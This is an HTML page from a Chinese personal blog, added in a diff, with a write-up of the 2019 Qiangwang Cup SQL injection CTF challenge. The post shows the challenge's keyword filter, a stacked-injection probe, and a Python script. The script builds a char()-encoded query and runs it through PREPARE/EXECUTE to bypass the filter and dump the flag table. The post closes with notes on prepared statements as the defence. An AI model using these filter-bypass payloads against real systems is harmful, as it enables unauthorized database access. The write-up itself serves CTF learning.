@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>强网杯2019-随便注-复盘总结 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      强网杯2019-随便注-复盘总结
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。</p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。</p>
+<pre><code class="php">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
+<p>明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者说无法使用联合查询之类的。尝试可以知道可以使用堆叠注入。</p>
+<pre><code class="mysql">1&#39;;show tables;#</code></pre>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190904/15676107961704.png" alt="img"></p>
+<p>但是由于过滤了select可以使用<code>concat()</code>将字符合成字符串而字符使用<code>char()</code>将ASCII转换为字符，即可bypass过滤，然后使用预处理执行目标语句。</p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="mysql">payload=&quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
+exp = &quot;select group_concat(flag) from supersqli.1919810931114514&quot;
+result=&#39;&#39;
+for i in exp:
+    result+=&quot;char(%s),&quot;%(ord(i))
+
+print(payload%(result[:-1]))#result[:-1]除去换行符</code></pre>
+<h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><p><a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
+<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="mysql批处理"><a href="#mysql批处理" class="headerlink" title="mysql批处理"></a>mysql批处理</h2><pre><code class="csharp">设置变量：set @s=sql语句
+预处理语句：prepare 预处理名字 from ‘sql语句’
+执行预处理：execute 预处理名字 [using 变量]</code></pre>
+<p>例子：</p>
+<pre><code class="shell">mysql &gt;&gt; set @s=&quot;select group_concat(flag) from supersqli.1919810931114514&quot;
+mysql &gt;&gt; PREPARE a FROM @s
+mysql &gt;&gt; EXECUTE a</code></pre>
+<h2 id="知识拓展——PHP预处理"><a href="#知识拓展——PHP预处理" class="headerlink" title="知识拓展——PHP预处理"></a>知识拓展——PHP预处理</h2><pre><code class="php">//预处理语句，?为绑定的参数
+$mysql = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)&quot;);
+
+//绑定参数第一个参数为参数列处理其余参数的数据类型。如下$firstname, $lastname, $email三个变量都为字符串类型所以，第一个参数为sss
+
+$mysql-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);
+
+/*参数1有以下四种类型:
+i - integer（整型）
+d - double（双精度浮点型）
+s - string（字符串）
+b - BLOB（布尔值）*/
+
+//下面设置参数并执行
+$firstname = &quot;John&quot;;
+$lastname = &quot;Doe&quot;;
+$email = &quot;john@example.com&quot;;
+$stmt-&gt;execute();</code></pre>
+<h2 id="php批处理的优点："><a href="#php批处理的优点：" class="headerlink" title="php批处理的优点："></a>php批处理的优点：</h2><ul>
+<li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</li>
+<li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</li>
+<li>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</li>
+</ul>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-09-04T15:18:49.000Z" itemprop="datePublished">2019-09-04</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-9-4-强网杯2019-随便注-复盘总结" data-title="强网杯2019-随便注-复盘总结" data-url="http://www.plasf.cn/2019/09/04/2019-9-4-强网杯2019-随便注-复盘总结/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
